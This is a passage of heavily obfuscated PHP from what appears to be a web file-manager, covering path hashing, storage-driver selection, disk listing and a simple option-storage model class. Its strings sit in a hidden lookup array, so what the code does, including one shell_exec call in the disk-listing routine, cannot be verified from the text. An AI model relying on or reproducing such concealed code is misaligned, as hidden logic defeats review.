return $Í½Şçˆ½; } public static function pathUrlClear($úêÌ×­) { $Í¸°¦¨• =& $_SERVER[Ï×Œõ”û]; if (!$úêÌ×­) { return $úêÌ×­; } $úêÌ×­ = rawurldecode($úêÌ×­); $úêÌ×­ = str_replace($Í¸°¦¨•[1421], $Í¸°¦¨•[8], $úêÌ×­); if (strpos($úêÌ×­, $Í¸°¦¨•[76]) > 0) { $úêÌ×­ = substr($úêÌ×­, 0, strpos($úêÌ×­, $Í¸°¦¨•[76])); } if (strpos($úêÌ×­, $Í¸°¦¨•[1424]) > 0) { $úêÌ×­ = substr($úêÌ×­, 0, strpos($úêÌ×­, $Í¸°¦¨•[1424])); } return $úêÌ×­; } public static function sourceID($‘¹ì«Ï’) { $šßµŒ¸Û =& $_SERVER[Ï×Œõ”û]; $î½‘Ùƒò = self::parse($‘¹ì«Ï’); if ($î½‘Ùƒò[$šßµŒ¸Û[33]] !== self::KOD_SOURCE) { show_json(LNG($šßµŒ¸Û[1425]), !1); } return $î½‘Ùƒò[$šßµŒ¸Û[484]]; } public static function make($İßÊó©î) { if (!$İßÊó©î) { return !1; } return self::makePath(self::KOD_SOURCE, intval($İßÊó©î)); } public static function makeShare($çŠÙô”µ, $òÈôïä) { return self::makePath(self::KOD_SHARE_ITEM, $çŠÙô”µ, $òÈôïä); } public static function makeFileTypePath($àê‚½ö) { return self::makePath(self::KOD_USER_FILE_TYPE, $àê‚½ö); } public static function makeFileTagPath($¬ä„§) { return self::makePath(self::KOD_USER_FILE_TAG, $¬ä„§); } public static function makePath($µ¨áäéô, $Æöö—½¼ = '', $ıÃ¥£µ² = '') { $ï®Ùê¿ =& $_SERVER[Ï×Œõ”û]; $©ÔÏŸ£Û = substr($µ¨áäéô, 1, -1); $ü˜â°æõ = $ï®Ùê¿[1426] . $©ÔÏŸ£Û . $ï®Ùê¿[1427] . $Æöö—½¼ . $ï®Ùê¿[1428]; $ü˜â°æõ = $ıÃ¥£µ² ? $ü˜â°æõ . $ıÃ¥£µ² . $ï®Ùê¿[8] : $ü˜â°æõ; return $ü˜â°æõ; } public static function hashPath($˜Êè”±À, $ú§Ùãé = false) { $–øÈ‹¹À =& $_SERVER[Ï×Œõ”û]; if (!$˜Êè”±À) { return $–øÈ‹¹À[12]; } $ÀÊÅèª• = is_array($˜Êè”±À) ? $˜Êè”±À : IO::info($˜Êè”±À); $õ¥¼ˆ‹À = _get($ÀÊÅèª•, $–øÈ‹¹À[1429], $–øÈ‹¹À[12]); if (!$õ¥¼ˆ‹À && isset($ÀÊÅèª•[$–øÈ‹¹À[562]])) { $õ¥¼ˆ‹À = $ÀÊÅèª•[$–øÈ‹¹À[562]]; } if (!$õ¥¼ˆ‹À && isset($ÀÊÅèª•[$–øÈ‹¹À[237]])) { $õ¥¼ˆ‹À = trim($ÀÊÅèª•[$–øÈ‹¹À[237]], $–øÈ‹¹À[119]); } if ($õ¥¼ˆ‹À) { return $õ¥¼ˆ‹À; } if (!$õ¥¼ˆ‹À && isset($ÀÊÅèª•[$–øÈ‹¹À[193]]) && $ÀÊÅèª•[$–øÈ‹¹À[193]]) { $ÀÊÅèª• = IO::info(KodIO::make($ÀÊÅèª•[$–øÈ‹¹À[193]])); $õ¥¼ˆ‹À = _get($ÀÊÅèª•, $–øÈ‹¹À[1429], $–øÈ‹¹À[12]); if (!$õ¥¼ˆ‹À && isset($ÀÊÅèª•[$–øÈ‹¹À[562]])) { $õ¥¼ˆ‹À = $ÀÊÅèª•[$–øÈ‹¹À[562]]; } } $ƒèšÜ‡† = md5($ÀÊÅèª•[$–øÈ‹¹À[87]] . $ÀÊÅèª•[$–øÈ‹¹À[79]] . $ÀÊÅèª•[$–øÈ‹¹À[88]]); $îâÜä§Á = $ƒèšÜ‡† . $–øÈ‹¹À[1430]; $õ¥¼ˆ‹À = $õ¥¼ˆ‹À ? $õ¥¼ˆ‹À : Cache::get($îâÜä§Á); if (!$õ¥¼ˆ‹À && $ú§Ùãé) { $õ¥¼ˆ‹À = IO::hashSimple($ÀÊÅèª•[$–øÈ‹¹À[87]]); Cache::set($îâÜä§Á, $õ¥¼ˆ‹À ? $õ¥¼ˆ‹À : $ƒèšÜ‡†, 3600 * 24 * 30); } return $õ¥¼ˆ‹À ? $õ¥¼ˆ‹À : $ƒèšÜ‡†; } public static function hashPathSafe($–²£À‡í, $ÆÆş¶¥ = false) { $¤ÔŸ¥Ö =& $_SERVER[Ï×Œõ”û]; $›­×íÚê = self::hashPath($–²£À‡í, $ÆÆş¶¥); return md5($›­×íÚê . $¤ÔŸ¥Ö[1431] . Model($¤ÔŸ¥Ö[879])->get($¤ÔŸ¥Ö[880])); } public static function initSystemPath() { $ŒÄç‚Ú =& $_SERVER[Ï×Œõ”û]; if (defined($ŒÄç‚Ú[1432])) { return; } define($ŒÄç‚Ú[1432], self::systemPath($ŒÄç‚Ú[191])); define($ŒÄç‚Ú[1433], self::systemPath($ŒÄç‚Ú[1434])); define($ŒÄç‚Ú[1435], self::systemPath($ŒÄç‚Ú[1436])); define($ŒÄç‚Ú[1437], self::systemPath($ŒÄç‚Ú[1438])); IOHistory::bindEvent(); } public static function systemPath($æÙµ½”) { $†º…€ =& $_SERVER[Ï×Œõ”û]; $ñŸ·Š“Ş = $†º…€[1439] . ucfirst($æÙµ½”); $Îñ“§¯ğ = Model($†º…€[879])->get($ñŸ·Š“Ş); if ($Îñ“§¯ğ) { return $Îñ“§¯ğ; } if ($æÙµ½” == $†º…€[191]) { $Îñ“§¯ğ = self::make(Model($†º…€[939])->systemRootPathAdd($†º…€[633])); } else { $Îñ“§¯ğ = self::systemPath($†º…€[191]); $ä¼Ï—Õ¬ = self::sourceID($Îñ“§¯ğ); $Îñ“§¯ğ = self::make(Model($†º…€[939])->mkdir($ä¼Ï—Õ¬, $æÙµ½”)); } Model($†º…€[879])->set($ñŸ·Š“Ş, $Îñ“§¯ğ); return $Îñ“§¯ğ; } public static function systemFolder($ğàæşÑ§) { $éÏ¸ùŒÈ = IO_PATH_SYSTEM_SOURCE . $ğàæşÑ§; $Ø…é­ = Cache::get($éÏ¸ùŒÈ); if (!$Ø…é­) { $è—È¿‘Ñ = IO::infoFullSimple($éÏ¸ùŒÈ); if (!$è—È¿‘Ñ) { $Ø…é­ = IO::mkdir($éÏ¸ùŒÈ, REPEAT_SKIP); } else { $Ø…é­ = $è—È¿‘Ñ[$_SERVER[Ï×Œõ”û][87]]; } Cache::set($éÏ¸ùŒÈ, $Ø…é­, 3600 * 10); } return $Ø…é­; } public static function defaultDriver() { return Model($_SERVER[Ï×Œõ”û][874])->defaultDriver(); } public static function defaultDriverInit() { $ŠÊ´¥“ =& $_SERVER[Ï×Œõ”û]; static $•æœ¶˜„ = false; if ($•æœ¶˜„) { return $•æœ¶˜„; } $²Ø•ûõ = self::defaultDriver(); $•æœ¶˜„ = IO::init($ŠÊ´¥“[1440] . $²Ø•ûõ[$ŠÊ´¥“[484]] . $ŠÊ´¥“[1428]); return $•æœ¶˜„; } public static function fileTypeList() { $ßÛÅãÉ‘ =& $_SERVER[Ï×Œõ”û]; $×˜Š‚ìÏ = $GLOBALS[$ßÛÅãÉ‘[6]][$ßÛÅãÉ‘[1441]]; foreach ($×˜Š‚ìÏ as $İñÕ–ü¥ => $ÛŠçåéí) { $Â€âõÒƒ = $ßÛÅãÉ‘[1442] . $İñÕ–ü¥; $º†äàİı = LNG($Â€âõÒƒ); if ($Â€âõÒƒ != $º†äàİı) { $×˜Š‚ìÏ[$İñÕ–ü¥][$ßÛÅãÉ‘[32]] = $º†äàİı; } } return $×˜Š‚ìÏ; } public static function ioFileDriverGet($Ò‰•‘¤Ó = '') { $šÁĞŸÒù =& $_SERVER[Ï×Œõ”û]; static $Î‰Âã§ı = array(); static $ñË»¥óÒ = array(); static $¥¹÷ú = array(); static $°¦¯öıÒ = false; if ($°¦¯öıÒ === !1) { $°¦¯öıÒ = array($šÁĞŸÒù[603] => array(), $šÁĞŸÒù[690] => array()); $†­à­¥ç = Model($šÁĞŸÒù[1443])->get(!1, $šÁĞŸÒù[1444]); foreach ($†­à­¥ç as $«í©õÔ· => $Î×˜”í) { if (!$Î×˜”í || $Î×˜”í == $šÁĞŸÒù[12]) { continue; } if (strstr($«í©õÔ·, $šÁĞŸÒù[1445])) { $Á­ô·Ò = str_replace($šÁĞŸÒù[1445], $šÁĞŸÒù[12], $«í©õÔ·); $°¦¯öıÒ[$šÁĞŸÒù[603]][$Á­ô·Ò] = $Î×˜”í; } else { if (strstr($«í©õÔ·, $šÁĞŸÒù[1446])) { $Á­ô·Ò = str_replace($šÁĞŸÒù[1446], $šÁĞŸÒù[12], $«í©õÔ·); $°¦¯öıÒ[$šÁĞŸÒù[690]][$Á­ô·Ò] = $Î×˜”í; } } } } $Ìã¬æ–ï = self::defaultDriver(); if (!$Ò‰•‘¤Ó || !$°¦¯öıÒ[$šÁĞŸÒù[603]] && !$°¦¯öıÒ[$šÁĞŸÒù[690]]) { return $Ìã¬æ–ï; } $Š­½æ”  = self::getPathSourceID($Ò‰•‘¤Ó); if (!$Š­½æ” ) { return $Ìã¬æ–ï; } if (isset($Î‰Âã§ı[$Š­½æ” ])) { return $Î‰Âã§ı[$Š­½æ” ]; } $Ê §‘Ëá = Model($šÁĞŸÒù[939])->sourceInfo($Š­½æ” ); $ÓŒ—ƒáË = $Ê §‘Ëá[$šÁĞŸÒù[594]]; $Óäêš×„ = array(); if (!$Ê §‘Ëá) { return $Ìã¬æ–ï; } if ($Ê §‘Ëá[$šÁĞŸÒù[190]] == $šÁĞŸÒù[91]) { if (isset($¥¹÷ú[$ÓŒ—ƒáË])) { return $¥¹÷ú[$ÓŒ—ƒáË]; } if (isset($°¦¯öıÒ[$šÁĞŸÒù[690]][$ÓŒ—ƒáË])) { $ğ¼å‡Õ = Model($šÁĞŸÒù[874])->driverInfo($°¦¯öıÒ[$šÁĞŸÒù[690]][$ÓŒ—ƒáË]); $Ìã¬æ–ï = $ğ¼å‡Õ ? $ğ¼å‡Õ : $Ìã¬æ–ï; $¥¹÷ú[$ÓŒ—ƒáË] = $Ìã¬æ–ï; $Î‰Âã§ı[$Š­½æ” ] = $Ìã¬æ–ï; return $Ìã¬æ–ï; } $Óäêš×„ = self::groupParentUser($ÓŒ—ƒáË); } else { if ($Ê §‘Ëá[$šÁĞŸÒù[190]] == $šÁĞŸÒù[529]) { $‘ÓÃŸßÂ = Model($šÁĞŸÒù[1447])->getInfo($ÓŒ—ƒáË); if ($‘ÓÃŸßÂ) { $Óäêš×„ = explode($šÁĞŸÒù[50], trim($‘ÓÃŸßÂ[$šÁĞŸÒù[609]], $šÁĞŸÒù[50])); $Óäêš×„ = array_remove_value($Óäêš×„, $šÁĞŸÒù[230]); $Óäêš×„[] = $ÓŒ—ƒáË; $Óäêš×„ = array_reverse($Óäêš×„); } } } foreach ($Óäêš×„ as $¤‰÷›œÎ) { if (!isset($°¦¯öıÒ[$šÁĞŸÒù[603]][$¤‰÷›œÎ])) { continue; } if (isset($ñË»¥óÒ[$¤‰÷›œÎ])) { return $ñË»¥óÒ[$¤‰÷›œÎ]; } $ğ¼å‡Õ = Model($šÁĞŸÒù[874])->driverInfo($°¦¯öıÒ[$šÁĞŸÒù[603]][$¤‰÷›œÎ]); $Ìã¬æ–ï = $ğ¼å‡Õ ? $ğ¼å‡Õ : $Ìã¬æ–ï; $ñË»¥óÒ[$¤‰÷›œÎ] = $Ìã¬æ–ï; break; } if ($Ê §‘Ëá[$šÁĞŸÒù[190]] == $šÁĞŸÒù[91]) { $¥¹÷ú[$ÓŒ—ƒáË] = $Ìã¬æ–ï; } $Î‰Âã§ı[$Š­½æ” ] = $Ìã¬æ–ï; return $Ìã¬æ–ï; } private static function getPathSourceID($¨è˜¿™ƒ) { $òÕï„ã— =& $_SERVER[Ï×Œõ”û]; static $ïİ§æƒ¨ = array(); if (!$¨è˜¿™ƒ) { return $òÕï„ã—[12]; } $µÊ˜¸‹á = substr($¨è˜¿™ƒ, 0, strlen($òÕï„ã—[503])) == $òÕï„ã—[503]; $ªû––Ñõ = substr($¨è˜¿™ƒ, 0, strlen($òÕï„ã—[1414])) == $òÕï„ã—[1414]; $¤­îÃ‹æ = substr($¨è˜¿™ƒ, 0, strlen($òÕï„ã—[1415])) == $òÕï„ã—[1415]; if (!$µÊ˜¸‹á && !$ªû––Ñõ && !$¤­îÃ‹æ) { return $òÕï„ã—[12]; } $À½ıò = self::parse($¨è˜¿™ƒ); $¯’şà’ = $À½ıò[$òÕï„ã—[1308]]; if ($µÊ˜¸‹á) { return $À½ıò[$òÕï„ã—[484]]; } if (isset($ïİ§æƒ¨[$¯’şà’])) { $ƒ¦êÅ€‹ = $ïİ§æƒ¨[$¯’şà’]; } else { $ƒ¦êÅ€‹ = IO::init($¯’şà’); $ïİ§æƒ¨[$¯’şà’] = $ƒ¦êÅ€‹; } if (isset($ƒ¦êÅ€‹->pathParse[$òÕï„ã—[1311]])) { return $ƒ¦êÅ€‹->pathParse[$òÕï„ã—[1311]]; } return $òÕï„ã—[12]; } private static function groupParentUser($—şËüì¯) { $¬’ÓÂÏ¤ =& $_SERVER[Ï×Œõ”û]; $÷¼»¬Ô• = Model($¬’ÓÂÏ¤[622])->getInfo($—şËüì¯); if (!$÷¼»¬Ô•) { return array(); } $İ¦·ğçÒ = array_to_keyvalue($÷¼»¬Ô•[$¬’ÓÂÏ¤[1448]], $¬’ÓÂÏ¤[12], $¬’ÓÂÏ¤[1449]); $œîäõ‰ = array(); foreach ($÷¼»¬Ô•[$¬’ÓÂÏ¤[1448]] as $ß¸¾™¥) { $œîäõ‰[] = $ß¸¾™¥[$¬’ÓÂÏ¤[1449]]; $Ì–Å¬éü = explode($¬’ÓÂÏ¤[50], trim($ß¸¾™¥[$¬’ÓÂÏ¤[609]], $¬’ÓÂÏ¤[50])); $Ì–Å¬éü = array_remove_value($Ì–Å¬éü, $¬’ÓÂÏ¤[230]); $Ì–Å¬éü = array_reverse($Ì–Å¬éü); $œîäõ‰ = array_merge($œîäõ‰, $Ì–Å¬éü); } return array_unique($œîäõ‰); } public static function diskList($ù…òÊ‰º = true) { $Ù ´ÎıŞ = $_SERVER[Ï×Œõ”û][1450]; if ($ù…òÊ‰º) { $³¢ÁèÇ = Cache::get($Ù ´ÎıŞ); if (is_array($³¢ÁèÇ)) { return $³¢ÁèÇ; } } $³¢ÁèÇ = self::diskListGet(); Cache::set($Ù ´ÎıŞ, $³¢ÁèÇ, 60); return $³¢ÁèÇ; } public static function diskListGet() { $€€İ¶Ç =& $_SERVER[Ï×Œõ”û]; $Ø°å€¨½ = array(); if ($GLOBALS[$€€İ¶Ç[6]][$€€İ¶Ç[1451]] == $€€İ¶Ç[1452]) { $¢Øö¦Ïƒ = $€€İ¶Ç[1453]; for ($ÙµĞ®ÒŒ = 0; $ÙµĞ®ÒŒ < strlen($¢Øö¦Ïƒ); $ÙµĞ®ÒŒ++) { $¸‹ğ¾è = $¢Øö¦Ïƒ[$ÙµĞ®ÒŒ] . $€€İ¶Ç[1454]; if (file_exists($¸‹ğ¾è)) { $Ø°å€¨½[] = $¸‹ğ¾è; } } return $Ø°å€¨½; } if (!function_exists($€€İ¶Ç[99])) { $Ø°å€¨½[] = $€€İ¶Ç[953]; return $Ø°å€¨½; } $‚ÆêçË¬ = explode($€€İ¶Ç[287], shell_exec($€€İ¶Ç[1455])); array_shift($‚ÆêçË¬); array_pop($‚ÆêçË¬); $èŞûø“… = array($€€İ¶Ç[1456], $€€İ¶Ç[1457], $€€İ¶Ç[1458], $€€İ¶Ç[1459], $€€İ¶Ç[1460], $€€İ¶Ç[1461], $€€İ¶Ç[1462], $€€İ¶Ç[1463]); foreach ($‚ÆêçË¬ as $Œ€âÊö) { $Íû¹‰Ï© = preg_split($€€İ¶Ç[1464], $Œ€âÊö); $¸‹ğ¾è = $Íû¹‰Ï©[count($Íû¹‰Ï©) - 1]; if (!strstr($Íû¹‰Ï©[0], $€€İ¶Ç[1465]) || !$¸‹ğ¾è) { continue; } $ïöäşæ¢ = rtrim($¸‹ğ¾è, $€€İ¶Ç[8]) . $€€İ¶Ç[8]; $Ø°å€¨½[] = $ïöäşæ¢; } return $Ø°å€¨½; } public static function isSameDisk($îî³à, $éÛÌã—) { $ÙàÅ¤ÙÛ =& $_SERVER[Ï×Œõ”û]; if ($GLOBALS[$ÙàÅ¤ÙÛ[6]][$ÙàÅ¤ÙÛ[1451]] == $ÙàÅ¤ÙÛ[1452]) { return strtolower(substr($îî³à, 0, 1)) == strtolower(substr($éÛÌã—, 0, 1)); } $Ã’³¾¿ë = stat($îî³à); $†£ = stat($éÛÌã—); if ($Ã’³¾¿ë === !1 || $†£ === !1) { return !1; } return $Ã’³¾¿ë[$ÙàÅ¤ÙÛ[1466]] === $†£[$ÙàÅ¤ÙÛ[1466]]; $î³Õ®“ = self::diskList(); $óŞÜØäû = !1; $¾ŞÛ÷ = !1; sort($î³Õ®“); $î³Õ®“ = array_reverse($î³Õ®“); $îî³à = rtrim($îî³à, $ÙàÅ¤ÙÛ[8]) . $ÙàÅ¤ÙÛ[8]; $éÛÌã— = rtrim($éÛÌã—, $ÙàÅ¤ÙÛ[8]) . $ÙàÅ¤ÙÛ[8]; foreach ($î³Õ®“ as $ºˆ¿ÆŒ) { $¤íêÊÇ = strlen($ºˆ¿ÆŒ); if (!$óŞÜØäû && substr($îî³à, 0, $¤íêÊÇ) == $ºˆ¿ÆŒ) { $óŞÜØäû = $ºˆ¿ÆŒ; } if (!$¾ŞÛ÷ && substr($éÛÌã—, 0, $¤íêÊÇ) == $ºˆ¿ÆŒ) { $¾ŞÛ÷ = $ºˆ¿ÆŒ; } if ($óŞÜØäû && $¾ŞÛ÷) { break; } } return $óŞÜØäû === $¾ŞÛ÷; } public static function transferType($—À¤×÷», $ä¯É¾Ã) { $ÃÇñÛÚö =& $_SERVER[Ï×Œõ”û]; $µÛÆÂ¾ö = self::driverType($—À¤×÷»); $Ğ¯ĞôìÖ = self::driverType($ä¯É¾Ã); if ($µÛÆÂ¾ö[$ÃÇñÛÚö[33]] == $Ğ¯ĞôìÖ[$ÃÇñÛÚö[33]] && $µÛÆÂ¾ö[$ÃÇñÛÚö[1467]] == $Ğ¯ĞôìÖ[$ÃÇñÛÚö[1467]]) { return $ÃÇñÛÚö[1468]; } if ($µÛÆÂ¾ö[$ÃÇñÛÚö[33]] == $ÃÇñÛÚö[987] && $Ğ¯ĞôìÖ[$ÃÇñÛÚö[33]] == $ÃÇñÛÚö[107]) { return $ÃÇñÛÚö[1336]; } if ($µÛÆÂ¾ö[$ÃÇñÛÚö[33]] == $ÃÇñÛÚö[107] && $Ğ¯ĞôìÖ[$ÃÇñÛÚö[33]] == $ÃÇñÛÚö[987]) { return $ÃÇñÛÚö[108]; } return $ÃÇñÛÚö[1469]; } public static function driverType($·ÜöŸ„†) { $Üó†ø¿ı =& $_SERVER[Ï×Œõ”û]; $­ş¼óëÙ = str_replace($Üó†ø¿ı[1470], $Üó†ø¿ı[12], strtolower($·ÜöŸ„†->getType())); if ($­ş¼óëÙ == $Üó†ø¿ı[864] || $­ş¼óëÙ == $Üó†ø¿ı[1471] || $­ş¼óëÙ == $Üó†ø¿ı[1472]) { $ì«ºëÂş = self::ioFileDriverGet($Üó†ø¿ı[503] . $·ÜöŸ„†->pathParse[$Üó†ø¿ı[1311]] . $Üó†ø¿ı[404]); $·ÜöŸ„† = IO::init($Üó†ø¿ı[1440] . $ì«ºëÂş[$Üó†ø¿ı[484]] . $Üó†ø¿ı[1428]); } else { if ($­ş¼óëÙ == $Üó†ø¿ı[1346] || $­ş¼óëÙ == $Üó†ø¿ı[1473]) { $·ÜöŸ„† = IO::init($·ÜöŸ„†->pathParse[$Üó†ø¿ı[1288]]); } } $”ğÌ¬“Õ = $·ÜöŸ„†->path; $­ş¼óëÙ = str_replace($Üó†ø¿ı[1470], $Üó†ø¿ı[12], strtolower($·ÜöŸ„†->getType())); if ($­ş¼óëÙ == $Üó†ø¿ı[107]) { return array($Üó†ø¿ı[33] => $Üó†ø¿ı[107], $Üó†ø¿ı[1467] => $Üó†ø¿ı[12], $Üó†ø¿ı[87] => $”ğÌ¬“Õ, $Üó†ø¿ı[96] => $·ÜöŸ„†); } return array($Üó†ø¿ı[33] => $Üó†ø¿ı[987], $Üó†ø¿ı[1467] => $·ÜöŸ„†->pathDriver, $Üó†ø¿ı[87] => $”ğÌ¬“Õ, $Üó†ø¿ı[96] => $·ÜöŸ„†); } public static function pathDriverType($¥·ÊÅµı) { return $¥·ÊÅµı ? self::driverType(IO::init($¥·ÊÅµı)) : !1; } public static function pathDriverLocal($ŸÚ¤±Ÿë) { $ÓğÎ…“ø =& $_SERVER[Ï×Œõ”û]; $ŞÃ…Ô¦» = $ŸÚ¤±Ÿë ? self::driverType(IO::init($ŸÚ¤±Ÿë)) : !1; return strtolower($ŞÃ…Ô¦»[$ÓğÎ…“ø[33]]) == $ÓğÎ…“ø[107] ? !0 : !1; } public static function allowCover($÷ø´ßµ­, $ÙæÊ°É˜ = true) { $ÇÆ±–Âö =& $_SERVER[Ï×Œõ”û]; if (is_string($÷ø´ßµ­)) { $÷ø´ßµ­ = IO::info($÷ø´ßµ­); } if (!$÷ø´ßµ­ || $÷ø´ßµ­[$ÇÆ±–Âö[33]] == $ÇÆ±–Âö[78] || $÷ø´ßµ­[$ÇÆ±–Âö[79]] <= 100) { return !1; } if (isset($÷ø´ßµ­[$ÇÆ±–Âö[1474]]) || !$÷ø´ßµ­[$ÇÆ±–Âö[87]]) { return !1; } if (isset($÷ø´ßµ­[$ÇÆ±–Âö[234]]) && !$÷ø´ßµ­[$ÇÆ±–Âö[234]]) { return !1; } static $ ïçí›¶ = false; if (!$ ïçí›¶ || !$ÙæÊ°É˜) { $‹¸ä×û = self::driverType(IO::init($÷ø´ßµ­[$ÇÆ±–Âö[87]])); $ë¾„×øÂ = $‹¸ä×û[$ÇÆ±–Âö[96]]; $ ïçí›¶ = $ÇÆ±–Âö[196]; if ($‹¸ä×û[$ÇÆ±–Âö[33]] == $ÇÆ±–Âö[107]) { $ ïçí›¶ = $ÇÆ±–Âö[1475]; } if ($‹¸ä×û[$ÇÆ±–Âö[96]] && is_array($‹¸ä×û[$ÇÆ±–Âö[96]]->config)) { $ë•ˆ€ØÏ = $‹¸ä×û[$ÇÆ±–Âö[96]]->config; if (isset($ë•ˆ€ØÏ[$ÇÆ±–Âö[1476]]) && $ë•ˆ€ØÏ[$ÇÆ±–Âö[1476]]) { $ ïçí›¶ = $ÇÆ±–Âö[1475]; } } $Å²ÕĞğ½ = KodIO::defaultDriver(); if (strtolower($Å²ÕĞğ½[$ÇÆ±–Âö[96]]) == $ÇÆ±–Âö[107] && is_array($Å²ÕĞğ½[$ÇÆ±–Âö[6]])) { $Á—Û›ñ¸ = $Å²ÕĞğ½[$ÇÆ±–Âö[6]][$ÇÆ±–Âö[1320]]; if (substr($Á—Û›ñ¸, 0, 2) == $ÇÆ±–Âö[1477]) { $Á—Û›ñ¸ = str_replace($ÇÆ±–Âö[1477], BASIC_PATH, $Á—Û›ñ¸); } $Á—Û›ñ¸ = str_replace($ÇÆ±–Âö[256], $ÇÆ±–Âö[8], $Á—Û›ñ¸); if (substr($÷ø´ßµ­[$ÇÆ±–Âö[87]], 0, strlen($Á—Û›ñ¸)) == $Á—Û›ñ¸) { $ ïçí›¶ = $ÇÆ±–Âö[196]; } } } return $ ïçí›¶ == $ÇÆ±–Âö[1475] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ßı÷²û) { parent::__construct($ßı÷²û); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto CÏÕï‹·‚«; f¾Ÿ‹©ÖšÒ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\155\117\160\164\151\x6f\156"; public $field = array(); public function listData($â‹‹¢‡ˆ = false, $Ôµ‰üè = "\x6d\x6f\x64\151\146\171\x54\151\x6d\145", $ñ”²˜ä½ = false) { $ÏãıÏû =& $_SERVER[Ï×Œõ”û]; $é“Û«Ô = Model($this->modelType)->get(!1, $this->optionType, !0); $ØòÓä“µ = array_values($é“Û«Ô); if ($ØòÓä“µ && $ØòÓä“µ[0] && !is_array($ØòÓä“µ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $é“Û«Ô = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$é“Û«Ô) { return $â‹‹¢‡ˆ ? null : array(); } if (!$â‹‹¢‡ˆ && $â‹‹¢‡ˆ !== $ÏãıÏû[230]) { $é“Û«Ô = array_filter(array_values($é“Û«Ô)); return array_sort_by($é“Û«Ô, $Ôµ‰üè, $ñ”²˜ä½, $ÏãıÏû[484]); } return $é“Û«Ô[$ÏãıÏû[485] . $â‹‹¢‡ˆ]; } public function insert($’ƒÃ¨¢Ô) { $Ù¼ÑöÚ =& $_SERVER[Ï×Œõ”û]; $’ƒÃ¨¢Ô = array_field_key($’ƒÃ¨¢Ô, $this->field); $ñ­ÁÉİª = Model($this->modelType)->get($Ù¼ÑöÚ[486], $this->optionType . $Ù¼ÑöÚ[487]); $ñ­ÁÉİª = $ñ­ÁÉİª ? $ñ­ÁÉİª : 0; $’ƒÃ¨¢Ô[$Ù¼ÑöÚ[484]] = ++$ñ­ÁÉİª; $’ƒÃ¨¢Ô[$Ù¼ÑöÚ[233]] = time(); $’ƒÃ¨¢Ô[$Ù¼ÑöÚ[88]] = time(); Model($this->modelType)->set($Ù¼ÑöÚ[486], $ñ­ÁÉİª, $this->optionType . $Ù¼ÑöÚ[487]); Model($this->modelType)->set($Ù¼ÑöÚ[485] . $ñ­ÁÉİª, $’ƒÃ¨¢Ô, $this->optionType); return $ñ­ÁÉİª; } public function insertArr($»¨ÖË»´) { $€½øãÖÑ =& $_SERVER[Ï×Œõ”û]; if (!$»¨ÖË»´ || !is_array($»¨ÖË»´)) { return !1; } $àŠƒÍÕÙ = Model($this->modelType)->get($€½øãÖÑ[486], $this->optionType . $€½øãÖÑ[487]); $àŠƒÍÕÙ = $àŠƒÍÕÙ ? $àŠƒÍÕÙ : 0; $¶İœ‹ğ¯ = array(); foreach ($»¨ÖË»´ as $¤Ò’ª¬¾) { $å€»Ãäœ = array_field_key($¤Ò’ª¬¾, $this->field); $å€»Ãäœ[$€½øãÖÑ[484]] = ++$àŠƒÍÕÙ; $å€»Ãäœ[$€½øãÖÑ[233]] = time(); $å€»Ãäœ[$€½øãÖÑ[88]] = time(); $¶İœ‹ğ¯[$€½øãÖÑ[485] . $àŠƒÍÕÙ] = $å€»Ãäœ; } Model($this->modelType)->set($€½øãÖÑ[486], $àŠƒÍÕÙ, $this->optionType . $€½øãÖÑ[487]); Model($this->modelType)->set($¶İœ‹ğ¯, !1, $this->optionType); return $àŠƒÍÕÙ; } public function update($§§à¼©, $ÇÕ¬×É¨) { $°¶úâÜŞ =& $_SERVER[Ï×Œõ”û]; $ÇÕ¬×É¨ = array_field_key($ÇÕ¬×É¨, $this->field); $Ê÷ŠúŸì = $this->listData($§§à¼©); if (!$Ê÷ŠúŸì || !$§§à¼©) { return !1; } $ÇÕ¬×É¨ = array_merge($Ê÷ŠúŸì, $ÇÕ¬×É¨); $ÇÕ¬×É¨[$°¶úâÜŞ[88]] = time(); return Model($this->modelType)->set($°¶úâÜŞ[485] . $§§à¼©, $ÇÕ¬×É¨, $this->optionType); } public function remove($×ÅÚĞÊ°) { if (!$×ÅÚĞÊ°) { return !1; } return Model($this->modelType)->remove($_SERVER[Ï×Œõ”û][485] . $×ÅÚĞÊ°, $this->optionType); } public function removeArr($İÓêÏ) { if (!$İÓêÏ) { return !0; } $îáàò»ê = array(); foreach ($İÓêÏ as $Çßõß) { $îáàò»ê[] = $_SERVER[Ï×Œõ”û][485] . $Çßõß; } return Model($this->modelType)->removeArr($îáàò»ê, $this->optionType); } public function clear() { $Á¸Öä©› =& $_SERVER[Ï×Œõ”û]; Model($this->modelType)->remove($Á¸Öä©›[486], $this->optionType . $Á¸Öä©›[487]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($„£‘Çµæ, $û·ïÏ´) { if (!$û·ïÏ´) { return !1; } $ı£¤…‚“ = $this->listData(); $ı£¤…‚“ = array_to_keyvalue($ı£¤…‚“, $„£‘Çµæ); return isset($ı£¤…‚“[$û·ïÏ´]) ? $ı£¤…‚“[$û·ïÏ´] : !1; } public function findByName($ÊÍğ´£) { return $this->findByKey($_SERVER[Ï×Œõ”û][32], $ÊÍğ´£); } protected function resetData($å¬•®Ç) { $¹¬îíœŞ =& $_SERVER[Ï×Œõ”û]; if (!$å¬•®Ç) { return; } $å¬•®Ç = is_array($å¬•®Ç) ? $å¬•®Ç : array(); $’ÛäóèÂ = array(); for ($„ŸËè–Ì = 0; $„ŸËè–Ì < count($å¬•®Ç); $„ŸËè–Ì++) { if (!$å¬•®Ç[$„ŸËè–Ì] || !$å¬•®Ç[$„ŸËè–Ì][$¹¬îíœŞ[484]]) { continue; } $’ÛäóèÂ[$¹¬îíœŞ[485] . $å¬•®Ç[$„ŸËè–Ì][$¹¬îíœŞ[484]]] = $å¬•®Ç[$„ŸËè–Ì]; } return Model($this->modelType)->set($’ÛäóèÂ, !1, $this->optionType); } private function getAutoName($Œü‚Ü®×) { $’Ì¸ªüÑ = array_to_keyvalue($this->listData(), $_SERVER[Ï×Œõ”û][32]); if (!$’Ì¸ªüÑ || !isset($’Ì¸ªüÑ[$Œü‚Ü®×])) { return $Œü‚Ü®×; } for ($‰Ä»ø®¬ = 1; $‰Ä»ø®¬ < count($’Ì¸ªüÑ); 